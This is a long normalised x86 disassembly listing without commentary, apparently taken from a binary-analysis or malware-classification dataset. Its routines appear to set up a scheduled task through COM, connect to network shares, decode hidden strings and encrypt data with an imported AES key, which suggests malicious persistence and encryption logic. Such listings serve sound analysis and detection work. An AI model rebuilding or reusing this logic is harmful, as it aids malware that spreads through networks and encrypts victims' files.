push rw-data
mov [ ebp - 0x18 ] esi
call [ CoCreateInstance@IAT ]
cmp eax esi
jge r-xdata
mov edx [ ebp - 0x18 ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
mov edi esp
mov eax [ ebp - 0x18 ]
lea esi [ ebp - 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ eax ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x28 ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
lea edx [ ebp - 0x1c ]
push edx
push r--data
push eax
call [ ecx + 0x1c ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov edx [ ebp - 0x1c ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x5c ]
push edx
mov esi r--data
push esi
push eax
call [ ecx + 0x34 ]
test eax eax
js r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
xor al al
jmp r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
push 0x1
push r--data
call sub_4102c5
push eax
call sub_40dbf0
mov [ ebx ] eax
test eax eax
jne r-xdata
mov edx [ ebp - 0x5c ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
push 0x0
push esi
push eax
call [ ecx + 0x3c ]
test eax eax
jns r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
lea edx [ ebp - 0x14 ]
push edx
push 0x0
push eax
call [ ecx + 0x24 ]
test eax eax
jns r-xdata
call sub_4102c5
mov edi eax
call sub_40e7b9
mov [ ebx ] eax
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
lea edx [ ebp - 0x38 ]
push edx
push eax
call [ ecx + 0x24 ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
mov edx [ ebp - 0x38 ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
lea edx [ ebp - 0x44 ]
push edx
push eax
call [ ecx + 0x44 ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
lea esi [ ebp + eax * 4 - 0xfc ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x44 ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push eax
call [ ecx + 0x3c ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x28 ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push eax
call [ ecx + 0x2c ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
cmp [ ebp + 0x8 ] 0x28
jge r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
lea edx [ ebp - 0x40 ]
push edx
push 0x0
push eax
call [ ecx + 0x30 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
push 0x3
push eax
call [ ecx + 0x38 ]
test eax eax
jns r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x40 ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
mov eax [ ebp - 0x40 ]
mov ecx [ eax ]
lea edx [ ebp - 0x30 ]
push edx
push rw-data
push eax
call [ ecx ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x30 ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
mov eax [ ebp - 0x30 ]
push [ ebx ]
mov ecx [ eax ]
push eax
call [ ecx + 0x2c ]
push 0x4
lea esi [ ebp - 0x100 ]
call sub_40edc9
mov eax [ ebp - 0x30 ]
mov ecx [ eax ]
mov edx esi
push edx
push eax
call [ ecx + 0x34 ]
cmp [ ebp + 0x8 ] 0x28
mov eax [ ebp - 0x38 ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
lea esi [ ebp + eax * 4 - 0xfc ]
push 0x9
push eax
call [ ecx + 0x28 ]
test eax eax
jns r-xdata
push 0x8
push eax
call [ ecx + 0x28 ]
test eax eax
jns r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x20 ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x34 ]
push edx
xor edi edi
push rw-data
mov [ ebp - 0x34 ] edi
mov ecx [ eax ]
push eax
call [ ecx ]
cmp eax edi
jge r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
mov edx [ ebp - 0x20 ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
xor edi edi
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x34 ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x900 ]
push eax
mov [ ebp - 0x2c ] 0x400
call [ GetUserNameW@IAT ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov ebx eax
cmp eax edi
je r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
or ebx 0xffffffff
push ebx
push eax
call [ ecx + 0x98 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0x50 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
push r--data
push eax
call [ ecx + 0x28 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
push 0x1f4
push eax
call [ ecx + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
push r--data
push eax
call [ ecx + 0x70 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0x48 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0x40 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
lea edx [ ebp - 0x3c ]
push edx
push eax
call [ ecx + 0x9c ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
push 0x1
push eax
call [ ecx + 0x48 ]
lea esi [ ebp + eax * 4 - 0xfc ]
cmp [ ebp + 0x8 ] 0x28
jl r-xdata
mov eax [ ebp - 0x34 ]
mov ecx [ eax ]
lea edx [ ebp - 0x900 ]
push edx
push eax
call [ ecx + 0x5c ]
cmp eax edi
jge r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x3c ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
mov eax [ ebp - 0x3c ]
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0x30 ]
lea eax [ ebp - 0x70 ]
push eax
call [ VariantInit@IAT ]
push 0x8
push edi
lea eax [ ebp - 0x70 ]
push eax
push eax
call [ VariantChangeType@IAT ]
push r--data
call [ SysAllocString@IAT ]
lea edx [ ebp - 0x24 ]
push edx
sub esp 0x10
cmp [ ebp + 0x8 ] 0x28
lea esi [ ebp - 0x58 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
movsd [ edi ] [ esi ]
lea esi [ ebp - 0x58 ]
jge r-xdata
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x78 ]
mov ebx eax
cmp eax edi
je r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
mov ebx eax
cmp eax edi
je r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
dec ebx
sub esi 0x4
cmp ebx edi
jne r-xdata
jmp r-xdata
push 0x5
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
movsd [ edi ] [ esi ]
mov edi esp
push 0x6
push [ ebp - 0x14 ]
lea esi [ ebp - 0x70 ]
push r--data
push 0x3
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
movsd [ edi ] [ esi ]
mov edi esp
push 0x6
push [ ebp - 0x14 ]
lea esi [ ebp - 0x58 ]
push r--data
jmp r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
lea esi [ ebp + eax * 4 - 0xfc ]
mov edx [ ebp - 0x24 ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
cmp [ ebp + 0x8 ] 0x32
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
call [ VariantClear@IAT ]
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x44 ]
test eax eax
jns r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
dec ebx
sub esi 0x4
cmp ebx edi
jne r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
dec ebx
sub esi 0x4
cmp ebx edi
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x70 ]
push eax
call [ VariantClear@IAT ]
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
lea edx [ ebp - 0x2c ]
push edx
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x30 ]
test eax eax
jns r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
mov al 0x1
lea esi [ ebp + eax * 4 - 0xfc ]
mov edx [ ebp - 0x2c ]
lea ecx [ ebp - 0xf8 ]
call sub_4015cb
lea eax [ ebp - 0x70 ]
push eax
call [ VariantClear@IAT ]
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x78 ]
mov edi eax
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
lea esi [ ebp + eax * 4 - 0xfc ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
sub_40948c
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_40d0df
mov esi eax
call sub_4089e0
xor ebx ebx
push ebx
call [ CoInitialize@IAT ]
test eax eax
jns r-xdata
push ebx
push ebx
push ebx
push 0x3
push 0x6
push ebx
push ebx
push 0xffffffff
push ebx
call [ CoInitializeSecurity@IAT ]
test eax eax
jns r-xdata
xor al al
mov [ esp + 0x14 ] ebx
call sub_412ae3
push esi
cmp eax 0x3
jl r-xdata
call [ CoUninitialize@IAT ]
mov al bl
jmp r-xdata
lea eax [ esp + 0x18 ]
push eax
call sub_408a67
pop ecx
lea ecx [ esp + 0x18 ]
call sub_408cce
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov bl [ esp + 0x13 ]
jmp r-xdata
push [ esp + 0x14 ]
call sub_412d05
mov [ esp + 0x17 ] al
pop ecx
cmp [ esp + 0x14 ] ebx
je r-xdata
sub_40951d
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
mov esi rw-data
mov al 0x1
jmp r-xdata
push 0x1
push ebx
call [ WNetCancelConnectionW@IAT ]
add esi edi
cmp esi rw-data
jl r-xdata
pop edi
pop esi
leave
retn
push 0x8
pop ecx
xor eax eax
lea edi [ ebp - 0x24 ]
[ edi ]
movzx eax [ esi ]
push 0x2
pop edi
push eax
push r--data
push ebx
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x1c ] 0x9
mov [ ebp - 0x18 ] 0x7
call [ wsprintfW@IAT ]
mov eax [ ebp + 0x8 ]
and [ ebp - 0x8 ] 0x0
add esp 0xc
push 0x4
push [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x14 ] ebx
call [ WNetAddConnection2W@IAT ]
test eax eax
je r-xdata
xor al al
sub_4095a2
push ebp
mov ebp esp
mov eax 0x222c
call sub_406c70
push ebx
push esi
push edi
push 0x6
pop ecx
push [ ebp + 0x18 ]
xor eax eax
push [ ebp + 0x14 ]
lea edi [ ebp - 0x1c ]
push [ ebp + 0x10 ]
lea ebx [ ebp - 0x1c ]
[ edi ]
call sub_40951d
add esp 0xc
test al al
je r-xdata
xor al al
push [ ebp + 0xc ]
mov eax ebx
push [ ebp + 0x1c ]
push eax
lea eax [ ebp - 0x228 ]
push r--data
push eax
call [ wsprintfW@IAT ]
lea eax [ ebp - 0x228 ]
add esp 0x14
test eax eax
je r-xdata
push 0x1
lea eax [ ebp - 0x1c ]
push eax
call [ WNetCancelConnectionW@IAT ]
push 0x1
push eax
call sub_40d7b3
mov esi eax
cmp esi 0xffffffff
je r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2228 ]
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
push 0x1
lea eax [ ebp - 0x1c ]
push eax
call [ WNetCancelConnectionW@IAT ]
mov al 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x2000
lea eax [ ebp - 0x2228 ]
push eax
push esi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edi [ ebp - 0x4 ]
test edi edi
jle r-xdata
lea eax [ ebp - 0x2228 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_40cb2c
jmp r-xdata
sub_40967c
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41adac
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x390
push ebx
push esi
push edi
lea esi [ esp + 0x2c ]
call sub_40c9fb
xor ebx ebx
mov [ esp + 0x3a4 ] ebx
lea eax [ esp + 0x50 ]
push eax
call sub_412634
mov [ esp + 0x3a4 ] 0x1
push r--data
call sub_40e6b8
cmp al bl
jne r-xdata
xor ecx ecx
mov eax r--data
mov [ esp + 0x4c ] ebx
cmp ecx eax
je r-xdata
mov [ esp + 0x3a4 ] bl
lea eax [ esp + 0x50 ]
push eax
call sub_4125f1
or [ esp + 0x3a4 ] 0xffffffff
call sub_40c938
xor al al
mov [ esp + 0x28 ] ebx
mov [ esp + 0xf ] bl
mov [ esp + 0x3c ] 0x40920001
push 0x4
lea ecx [ esp + 0x50 ]
push ecx
push 0x4
push r--data
push eax
push 0x80000001
call sub_40c46e
xor bl bl
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x20 ]
mov esi ebx
mov [ esp + 0x14 ] 0xf22f2ed
call sub_412589
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x24 ]
mov [ esp + 0x14 ] 0x124a76f5
call sub_412589
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x1c ]
mov [ esp + 0x14 ] 0x15289533
call sub_412589
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x28 ]
mov [ esp + 0x14 ] 0x623397cf
call sub_412589
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x44 ]
mov ecx ebx
mov [ esp + 0x14 ] 0x7f4becad
call sub_4125af
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x48 ]
mov ecx ebx
mov [ esp + 0x14 ] 0x69b8e0a0
call sub_4125af
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x4c ]
mov esi ebx
mov [ esp + 0x14 ] 0x5288a31
call sub_412589
push [ esp + 0x48 ]
mov ebx [ lstrcpyW@IAT ]
lea eax [ esp + 0x21c ]
push eax
call ebx
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x7c5d2258
call sub_412589
push [ esp + 0x14 ]
lea eax [ esp + 0x11c ]
push eax
call ebx
push 0x80beaa2a
lea eax [ esp + 0x9c ]
push r--data
push eax
call [ wsprintfW@IAT ]
mov ebx [ lstrcatW@IAT ]
add esp 0xc
lea eax [ esp + 0x98 ]
push eax
lea eax [ esp + 0x11c ]
push eax
call ebx
lea eax [ esp + 0x118 ]
push eax
lea eax [ esp + 0x29c ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14 ] 0xc422369
call sub_412589
push [ esp + 0x14 ]
lea eax [ esp + 0x11c ]
push eax
call ebx
mov eax [ ebp + 0x8 ]
call sub_40d34b
push edx
push eax
lea eax [ esp + 0xa0 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ esp + 0x98 ]
push eax
lea eax [ esp + 0x29c ]
push eax
call ebx
push [ esp + 0x14 ]
lea eax [ esp + 0x29c ]
push eax
call ebx
xor edi edi
mov ecx [ esp + 0x39c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push [ esp + 0x24 ]
lea eax [ esp + 0x11c ]
push [ esp + 0x1c ]
push [ esp + 0x28 ]
push [ esp + 0x28 ]
push eax
lea eax [ esp + 0x40 ]
push eax
call sub_4095a2
add esp 0x18
test al al
je r-xdata
mov esi [ esp + 0x30 ]
mov [ esp + 0xf ] 0x1
test esi esi
jne r-xdata
push [ esp + 0x24 ]
lea eax [ esp + 0x21c ]
push [ esp + 0x1c ]
push [ esp + 0x28 ]
push [ esp + 0x28 ]
push eax
lea eax [ esp + 0x40 ]
push eax
call sub_4095a2
add esp 0x18
test al al
je r-xdata
mov esi [ esp + 0x30 ]
mov [ esp + 0xf ] 0x1
test esi esi
jne r-xdata
mov edi [ ebp + 0x10 ]
jle r-xdata
cmp [ esp + 0xf ] 0x0
jne r-xdata
mov esi [ esp + 0x30 ]
mov [ esp + 0xf ] 0x1
mov bl [ esp + 0xf ]
mov [ edi ] esi
jmp r-xdata
cmp esi [ edi ]
jge r-xdata
test esi esi
mov eax [ esp + 0x40 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
inc edi
cmp edi [ esp + 0x44 ]
jle r-xdata
mov [ esp + 0x3a4 ] 0x0
lea eax [ esp + 0x50 ]
push eax
call sub_4125f1
or [ esp + 0x3a4 ] 0xffffffff
lea esi [ esp + 0x2c ]
call sub_40c938
mov al bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ esp + 0x24 ]
lea eax [ esp + 0x29c ]
push [ esp + 0x1c ]
xor esi esi
push [ esp + 0x28 ]
push [ esp + 0x28 ]
push eax
lea eax [ esp + 0x40 ]
push eax
call sub_4095a2
add esp 0x18
test al al
je r-xdata
jmp r-xdata
push esi
push [ esp + 0x30 ]
push [ ebp + 0xc ]
call sub_406530
add esp 0xc
inc [ esp + 0x28 ]
mov eax [ esp + 0x28 ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x40 ]
push eax
lea eax [ esp + 0x7c ]
push eax
push ecx
call sub_4155b9
pop ecx
push eax
call sub_4154a1
mov [ esp + 0x3a4 ] 0x2
push eax
lea ebx [ esp + 0x54 ]
call sub_40157d
mov [ esp + 0x3a4 ] 0x1
lea eax [ esp + 0x74 ]
push eax
call sub_4125f1
mov eax [ esp + 0x58 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
sub_409a44
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
xor eax eax
push edi
xor edi edi
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] eax
jbe r-xdata
mov al 0x1
push 0x10
pop ebx
mov ecx ebx
sub ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx ecx
mov esi ecx
shr esi 0x10
and edx 0xff0000
or edx esi
mov esi ecx
shl ecx 0x10
push ebx
and esi 0xff00
or esi ecx
lea ecx [ ebp - 0x8 ]
push ecx
lea ecx [ ebp - 0x1c ]
push ecx
push eax
push eax
shr edx 0x8
push eax
push [ ebp + 0xc ]
shl esi 0x8
or edx esi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
call [ CryptEncrypt@IAT ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
lea ecx [ edi + eax ]
mov eax [ ebp - 0xc ]
add eax ecx
cmp eax esi
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub esi edi
mov esi ebx
jmp r-xdata
add edi ebx
inc [ ebp - 0x4 ]
cmp edi [ ebp + 0x8 ]
jb r-xdata
mov dl [ ebp + eax - 0x1c ]
xor [ ecx + eax ] dl
inc eax
cmp eax esi
jb r-xdata
xor eax eax
test esi esi
je r-xdata
xor eax eax
sub_409b23
push ebp
mov ebp esp
sub esp 0x30
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x8
pop ecx
push ebx
xor eax eax
push eax
push eax
mov [ ebx ] eax
push 0x2c
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x8 ]
xor edx edx
mov [ ebp - 0x30 ] cl
mov [ ebp - 0x2f ] 0x2
mov [ ebp - 0x2e ] dx
mov [ ebp - 0x2c ] 0x6610
mov [ ebp - 0x28 ] 0x20
lea edi [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x2
[ edi ] [ esi ]
call [ CryptImportKey@IAT ]
pop edi
pop esi
test eax eax
jne r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x4
push [ ebx ]
call [ CryptSetKeyParam@IAT ]
test eax eax
setne al
leave
retn
xor al al
leave
retn
sub_409b8f
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx [ lstrlenA@IAT ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi r--data
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x18 ]
push eax
movsd [ edi ] [ esi ]
call ebx
mov edi [ ebp + 0xc ]
mov esi eax
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
mov [ ebp - 0x4 ] 0x3
mov [ ebp + esi - 0x29 ] 0x3e
mov [ ebp + esi - 0x1a ] 0x3e
mov [ ebp + esi - 0x28 ] 0x0
mov [ ebp + esi - 0x19 ] 0x0
add al 0x30
mov [ ebp + esi - 0x1a ] al
mov [ ebp + esi - 0x29 ] al
jmp r-xdata
dec [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push eax
call [ StrStrA@IAT ]
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x8 ]
call [ StrStrA@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x1
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
cmp eax [ ecx ]
jbe r-xdata
lea eax [ ebp - 0x18 ]
push eax
call ebx
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
sub edi eax
mov [ ecx ] eax
jns r-xdata
xor al al
jmp r-xdata
mov eax edi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov al 0x1
sub_409c74
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
mov [ ebp - 0xc ] 0x20
mov ecx 0x200
mov eax edx
xor ebx ebx
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
mov esi [ CryptHashData@IAT ]
xor edi edi
mov [ ebp - 0x10 ] edx
push [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x10 ]
call sub_406530
